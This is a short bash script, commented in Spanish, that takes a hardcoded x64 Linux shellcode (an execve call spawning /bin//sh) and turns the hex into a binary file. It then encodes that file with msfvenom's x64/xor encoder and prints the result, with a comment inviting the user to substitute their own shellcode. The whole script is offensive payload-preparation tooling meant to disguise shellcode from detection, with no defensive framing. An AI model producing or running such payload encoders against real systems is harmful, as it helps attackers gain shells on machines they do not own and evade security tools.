#!/bin/bash

# Shellcode en hexadecimal (MODIFICA AQUÍ TU SHELLCODE)
SHELLCODE_HEX="b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05"

# Archivo temporal para el shellcode binario
SHELLCODE_BIN="shell.bin"

# Archivo de salida con el shellcode codificado
ENCODED_SHELLCODE="encoded_shellcode.hex"

echo "[*] Generando shellcode binario..."
echo -n "$SHELLCODE_HEX" | xxd -r -p > "$SHELLCODE_BIN"

echo "[*] Codificando shellcode con msfvenom..."
msfvenom -p - -a x64 --platform linux -f hex -e x64/xor < "$SHELLCODE_BIN" > "$ENCODED_SHELLCODE"

echo "[*] Shellcode codificado:"
cat "$ENCODED_SHELLCODE"

echo "[*] Guardado en $ENCODED_SHELLCODE"